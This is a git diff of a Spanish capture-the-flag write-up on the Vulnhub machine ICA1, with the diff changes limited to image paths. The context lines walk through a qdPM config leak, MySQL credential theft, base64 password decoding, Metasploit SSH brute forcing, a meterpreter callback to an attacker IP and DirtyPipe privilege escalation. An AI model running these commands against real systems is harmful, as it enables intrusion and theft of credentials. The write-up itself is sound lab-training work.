@@ -6,7 +6,6 @@ categories: [Writeup, Vulnhub]
 tag: [searchsploit,mysql,base64,scripts,metasploit,cve_2022_0847_dirtypipe]
 image: /assets/images/ICA1/featured_image_ICA.jpg
 alt: portada de WriteUp ICA
-img_path: ../assets/images/ICA1/
 ---
 
 
@@ -18,15 +17,15 @@ Según la información de nuestra red de inteligencia, la ICA está trabajando e
 
 ## Resolucion de la maquina
 
-![alt text](image.png)
+![alt text](../assets/images/ICA1/image.png)
 
 ### Fase de Fingerprinting / Reconocimiento (Reconnaissance):
 
 #### Descubrimiento de IP objetivo en la red
 
-![alt text](image-2.png)
+![alt text](../assets/images/ICA1/image-2.png)
 
-![alt text](image-1.png)
+![alt text](../assets/images/ICA1/image-1.png)
 
 #### Descubrimiento de puertos y servicios en el host objetivo
 
@@ -46,7 +45,7 @@ PORT      STATE SERVICE
 33060/tcp open  mysqlx
 ```
 
-![alt text](image-3.png)
+![alt text](../assets/images/ICA1/image-3.png)
 
 Realizo un escaneo con mas profundidad sobre los puertos detectados, buscando los servicios tras los puertos, asi como la ejecucion de scripts basicos para detectar vulnerabilidades y este resultado lo almacenare en diferentes formatos con nombre nmap_ICA
 
@@ -128,7 +127,7 @@ OS details: Linux 4.15 - 5.8
 
 Realizo una exploracion visual mediante el navegador al puerto 80 de la ip de la maquina objetivo.
 
-![alt text](image-4.png)
+![alt text](../assets/images/ICA1/image-4.png)
 
 La pagina de acceso me da la bienvenida a un servicio llamado qdPM, ofreciendo un login. 
 
@@ -138,7 +137,7 @@ Veo que indica la versión 9.2 de qdPM. Voy a comprobar si esta version tiene vu
 searchsploit qdPM 9.2
 ```
 
-![alt text](image-6.png)
+![alt text](../assets/images/ICA1/image-6.png)
 
 Copio el exploit a mi directorio de trabajo.
 
@@ -146,7 +145,7 @@ Copio el exploit a mi directorio de trabajo.
 searchsploit -m 50176
 ```
 
-![alt text](image-7.png)
+![alt text](../assets/images/ICA1/image-7.png)
 
 Compruebo el exploit, para ver cuales son las instrucciones para usarlo.
 
@@ -154,7 +153,7 @@ Compruebo el exploit, para ver cuales son las instrucciones para usarlo.
 cat 50176.txt
 ```
 
-![alt text](image-8.png)
+![alt text](../assets/images/ICA1/image-8.png)
 
 En las instrucciones me indican que la clave y la password de conexion a la base de datos esta guardada en un fichero de configuracion yml al que se puede acceder en una direccion web. 
 
@@ -164,7 +163,7 @@ Descargo el fichero usando la ruta de la URL en la maquina objetivo.
 wget http://192.168.88.7/core/config/databases.yml
 ```
 
-![alt text](image-9.png)
+![alt text](../assets/images/ICA1/image-9.png)
 
 Compruebo el fichero descargado:
 
@@ -172,7 +171,7 @@ Compruebo el fichero descargado:
 cat databases.yml
 ```
 
-![alt text](image-10.png)
+![alt text](../assets/images/ICA1/image-10.png)
 
 ```sh
 all:
@@ -204,9 +203,9 @@ setg RHOSTS 192.168.88.7
 exploit
 ```
 
-![alt text](image-14.png)
+![alt text](../assets/images/ICA1/image-14.png)
 
-![alt text](image-15.png)
+![alt text](../assets/images/ICA1/image-15.png)
 
 Obtengo que la version de MySQL que esta corriendo en la maquina es la 8.0.26.
 
@@ -221,15 +220,15 @@ set password UcVQCMQk2STVeS6J
 exploit
 ```
 
-![alt text](image-16.png)
+![alt text](../assets/images/ICA1/image-16.png)
 
 ##### Enumeracion de Esquema de las bases de datos.
 
 Usare el modulo mysql_schemadump para obtener el esquema de las bases de datos del servidor mysql.
 
-![alt text](image-18.png)
+![alt text](../assets/images/ICA1/image-18.png)
 
-![alt text](image-17.png)
+![alt text](../assets/images/ICA1/image-17.png)
 
 ### Explotación
 
@@ -241,7 +240,7 @@ Para explotar el servicio de mysql me conecto al servicio con las credenciales o
 mysql -u qdpmadmin -p -h 192.168.88.7 -P 3306 
 ```
 
-![alt text](image-11.png)
+![alt text](../assets/images/ICA1/image-11.png)
 
 Compruebo cuales bases de datos existen.
 
@@ -249,7 +248,7 @@ Compruebo cuales bases de datos existen.
 SHOW DATABASES;
 ```
 
-![alt text](image-12.png)
+![alt text](../assets/images/ICA1/image-12.png)
 
 Accedo a la base de datos qdpm ya que supongo que sera la base de datos de la aplicacion web y podre obtener algun usuario.
 
@@ -257,7 +256,7 @@ Accedo a la base de datos qdpm ya que supongo que sera la base de datos de la ap
 USE qdpm
 ```
 
-![alt text](image-19.png)
+![alt text](../assets/images/ICA1/image-19.png)
 
 Compruebo las tablas que existen en la base de datos qdpm.
 
@@ -265,7 +264,7 @@ Compruebo las tablas que existen en la base de datos qdpm.
 SHOW TABLES;
 ```
 
-![alt text](image-20.png)
+![alt text](../assets/images/ICA1/image-20.png)
 
 ```sh
 +----------------------+
@@ -299,7 +298,7 @@ La tabla users llama mi atencion y compruebo su contenido
 select * from users;
 ```
 
-![alt text](image-37.png)
+![alt text](../assets/images/ICA1/image-37.png)
 
 Esta consulta me indica que la base de datos esta vacia, por lo que cambio de base de datos qdpm a base de datos staff y consulto las tablas de las que dispone.
 
@@ -308,7 +307,7 @@ USE staff;
 SHOW TABLES;
 ```
 
-![alt text](image-26.png)
+![alt text](../assets/images/ICA1/image-26.png)
 
 Consulto el contenido de la tabla `user`
 
@@ -316,7 +315,7 @@ Consulto el contenido de la tabla `user`
 select * from user;
 ```
 
-![alt text](image-27.png)
+![alt text](../assets/images/ICA1/image-27.png)
 
 Consulto el contenido de la tabla `department`
 
@@ -324,7 +323,7 @@ Consulto el contenido de la tabla `department`
 select * from department;
 ```
 
-![alt text](image-38.png)
+![alt text](../assets/images/ICA1/image-38.png)
 
 Consulto el contenido de la tabla `login`
 
@@ -332,7 +331,7 @@ Consulto el contenido de la tabla `login`
 select * from login;
 ```
 
-![alt text](image-39.png)
+![alt text](../assets/images/ICA1/image-39.png)
 
 En esta tabla vemos que existe un campo password. Observando los valores veo que parece que estan codificados en base64. 
 
@@ -342,7 +341,7 @@ Voy a unir las tablas user y login para obtener la relacion entre usuarios y cla
 SELECT user.name AS nombre, login.password AS clave FROM user JOIN login ON user.id = login.user_id;
 ```
 
-![alt text](image-41.png)
+![alt text](../assets/images/ICA1/image-41.png)
 
 Como los valores de las claves estan en base64 puedo hacer la decodificacion directamente en SQL mediante la funcion `FROM_BASE64()`
 
@@ -350,7 +349,7 @@ Como los valores de las claves estan en base64 puedo hacer la decodificacion dir
 SELECT user.name AS nombre, login.password AS clave, FROM_BASE64(login.password) AS decoded_password FROM user JOIN login ON user.id = login.user_id;
 ```
 
-![alt text](image-42.png)
+![alt text](../assets/images/ICA1/image-42.png)
 
 ```txt
 +---------+--------------------------+------------------+
@@ -366,9 +365,9 @@ SELECT user.name AS nombre, login.password AS clave, FROM_BASE64(login.password)
 
 Creo ficheros con los nombres y las claves descodificadas.
 
-![alt text](image-46.png)
+![alt text](../assets/images/ICA1/image-46.png)
 
-![alt text](image-33.png)
+![alt text](../assets/images/ICA1/image-33.png)
 
 Voy a crear un fichero de nombres de usuario basandome en los nombres de las personas obtenida en la base de datos. 
 
@@ -377,7 +376,7 @@ Para esto creo un fichero de script en bash llamado `procesar_nombres.sh`. Este 
 El script usará los nombres del fichero para darme los mismos nombres tanto en mayusculas como en minusculas y escribira una linea con cada generacion de usuario.
 
 
-![alt text](image-43.png)
+![alt text](../assets/images/ICA1/image-43.png)
 
 El codigo del script es el siguiente:
 
@@ -437,11 +436,11 @@ Una vez creado el script lo guardo y compruebo sus permisos de ejecucion
 
 ls -l procesar_nombres.sh
 
-![alt text](image-44.png)
+![alt text](../assets/images/ICA1/image-44.png)
 
 chmod +x procesar_nombres.sh
 
-![alt text](image-45.png)
+![alt text](../assets/images/ICA1/image-45.png)
 
 Ahora ejecuto el script creado pasandole como parametros el fichero de nombres que cree y dandole un archivo de salida.
 
@@ -449,11 +448,11 @@ Ahora ejecuto el script creado pasandole como parametros el fichero de nombres q
 procesar_nombres.sh nombres.txt usuarios.txt
 ```
 
-![alt text](image-47.png)
+![alt text](../assets/images/ICA1/image-47.png)
 
 Compruebo su contenido para verificar que es lo esperado.
 
-![alt text](image-48.png)
+![alt text](../assets/images/ICA1/image-48.png)
 
 #### Explotacion del servicio SSH
 
@@ -467,7 +466,7 @@ search ssh_login
 use auxiliary/scanner/ssh/ssh_login
 ```
 
-![alt text](image-49.png)
+![alt text](../assets/images/ICA1/image-49.png)
 
 ```sh
 set PASS_FILE pass.txt
@@ -476,19 +475,19 @@ set verbose true
 exploit
 ```
 
-![alt text](image-50.png)
+![alt text](../assets/images/ICA1/image-50.png)
 
 Espero que se ejecute el ataque. En los resultados veo que se consiguen dos sesiones ssh al servidor, una con el usuario `dexter` y otra con el usuario `travis`.
 
-![alt text](image-51.png)
+![alt text](../assets/images/ICA1/image-51.png)
 
-![alt text](image-52.png)
+![alt text](../assets/images/ICA1/image-52.png)
 
 Puedo consultar las sesiones abiertas con el comando `sessions`
 
-![alt text](image-53.png)
+![alt text](../assets/images/ICA1/image-53.png)
 
-![alt text](image-55.png)
+![alt text](../assets/images/ICA1/image-55.png)
 
 Voy a upgradear la sesion 1 a una sesion de meterpreter para poder usar mas adelante modulos de enumeracion en la maquina objetivo.
 
@@ -498,7 +497,7 @@ Para esto uso el modulo `shell_to_meterpreter`
 use post/multi/manage/shell_to_meterpreter
 ```
 
-![alt text](image-56.png)
+![alt text](../assets/images/ICA1/image-56.png)
 
 Defino la sesion 1 y la IP para el localhost contra la que devolvera la sesion de meterpreter.
 
@@ -507,15 +506,15 @@ set session 1
 set LhOST 192.168.88.3
 ```
 
-![alt text](image-57.png)
+![alt text](../assets/images/ICA1/image-57.png)
 
 Lanzo el modulo con el comando `exploit`
 
-![alt text](image-58.png)
+![alt text](../assets/images/ICA1/image-58.png)
 
 Compruebo con el comando `sessions` que tengo una session 3 de tipo meterpreter 
 
-![alt text](image-59.png)
+![alt text](../assets/images/ICA1/image-59.png)
 
 abro la session 3 de forma interactiva.
 
@@ -523,7 +522,7 @@ abro la session 3 de forma interactiva.
 sessions -i 3
 ```
 
-![alt text](image-60.png)
+![alt text](../assets/images/ICA1/image-60.png)
 
 ### Enumeracion local del sistema 
 
@@ -533,7 +532,7 @@ Ahora que he comprobado que tengo acceso a la session 3 mediante meterpreter, vo
 background
 ```
 
-![alt text](image-61.png)
+![alt text](../assets/images/ICA1/image-61.png)
 
 #### Enumeracion local de la red en la maquina objetivo.
 
@@ -545,11 +544,11 @@ use post/linux/gather/enum_network
 
 Compruebo las opciones requeridas para lanzarlo con el comando `options`
 
-![alt text](image-66.png)
+![alt text](../assets/images/ICA1/image-66.png)
 
 Ejecuto con `run` el modulo y comienza a hacer la enumeracion volcando la informacion en unos ficheros dentro de la carpeta **`/home/kali/.msf4/loot/`**
 
-![alt text](image-67.png)
+![alt text](../assets/images/ICA1/image-67.png)
 
 Los ficheros que obtengo son los siguientes:
 
@@ -565,7 +564,7 @@ Los ficheros que obtengo son los siguientes:
 | Listening ports      | linux.enum.netwo_207902.txt |
 | If-Up/If-Down        | linux.enum.netwo_951546.txt |
 
-![alt text](image-68.png)
+![alt text](../assets/images/ICA1/image-68.png)
 
 Podemos consultar el contenido de ellos con el comando `cat`. Por ejemplo si quisiera ver el resultado de la enumeracion de la configuracion de red usaria:
 
@@ -573,7 +572,7 @@ Podemos consultar el contenido de ellos con el comando `cat`. Por ejemplo si qui
 cat 20241201065015_default_192.168.88.7_linux.enum.netwo_435546.txt
 ```
 
-![alt text](image-69.png)
+![alt text](../assets/images/ICA1/image-69.png)
 
 #### Enumeracion local de la configuraciones en la maquina objetivo.
 
@@ -583,7 +582,7 @@ Para ello usare el modulo:
 use post/linux/gather/enum_configs
 ```
 
-![alt text](image-64.png)
+![alt text](../assets/images/ICA1/image-64.png)
 
 Obtenemos la siguiente informacion que se almacena en ficheros.
 
@@ -601,7 +600,7 @@ Obtenemos la siguiente informacion que se almacena en ficheros.
 | ldap.conf            | linux.enum.conf_313793.txt |
 | sysctl.conf          | linux.enum.conf_398036.txt |
 
-![alt text](image-65.png)
+![alt text](../assets/images/ICA1/image-65.png)
 
 
 #### Enumeracion local de informacion del sistema en la maquina objetivo.
@@ -612,10 +611,10 @@ Para esta enumeracion utilizaré:
 use post/linux/gather/enum_system
 ```
 
-![alt text](image-70.png)
+![alt text](../assets/images/ICA1/image-70.png)
 
 
-![alt text](image-71.png)
+![alt text](../assets/images/ICA1/image-71.png)
 
 | Configuracion       | fichero acabado en...       |
 | ------------------- | --------------------------- |
@@ -631,11 +630,11 @@ use post/linux/gather/enum_system
 
 Obtengo los siguientes ficheros:
 
-![alt text](image-72.png)
+![alt text](../assets/images/ICA1/image-72.png)
 
 Compruebo si existen trabajos cron del usuario con el que enumero.
 
-![alt text](image-73.png)
+![alt text](../assets/images/ICA1/image-73.png)
 
 ### Elevacion de privilegios
 
@@ -649,11 +648,11 @@ set session 3
 exploit
 ```
 
-![alt text](image-76.png)
+![alt text](../assets/images/ICA1/image-76.png)
 
 Espero que termine la comprobacion de vulnerabilidades.
 
-![alt text](image-77.png)
+![alt text](../assets/images/ICA1/image-77.png)
 
 Obtengo la siguiente tabla de vulnerabilidades disponibles para probar que pueden tener bastante exito.
 
@@ -678,9 +677,9 @@ En primer lugar me informo de la vulnerabilidad:
 info exploit/linux/local/cve_2022_0847_dirtypipe  
 ```
 
-![alt text](image-80.png)
+![alt text](../assets/images/ICA1/image-80.png)
 
-![alt text](image-81.png)
+![alt text](../assets/images/ICA1/image-81.png)
 
 Defino la session a usar, la ip de mi maquina atacante y un puerto libre de mi maquina
 
@@ -690,24 +689,24 @@ set LHOST 192.168.88.3
 set LPORT 7331
 ```
 
-![alt text](image-82.png)
+![alt text](../assets/images/ICA1/image-82.png)
 
 Compruebo que todo esta en orden con el comando `options`
 
-![alt text](image-83.png)
+![alt text](../assets/images/ICA1/image-83.png)
 
 Ejecuto el exploit obteniendo una sesion de meterpreter.
 
-![alt text](image-84.png)
+![alt text](../assets/images/ICA1/image-84.png)
 
 Compruebo en esta sesion de meterpreter que usuario soy y me da que soy root en la maquina objetivo.
 
 
 
-![alt text](image-85.png)
+![alt text](../assets/images/ICA1/image-85.png)
 
 Abro una shell desde meterpreter, y compruebo el contenido de la carpeta **`/root`** y consulto la flag root.txt
 
-![alt text](image-86.png)
+![alt text](../assets/images/ICA1/image-86.png)
 
 Con esto queda resuelta la maquina.
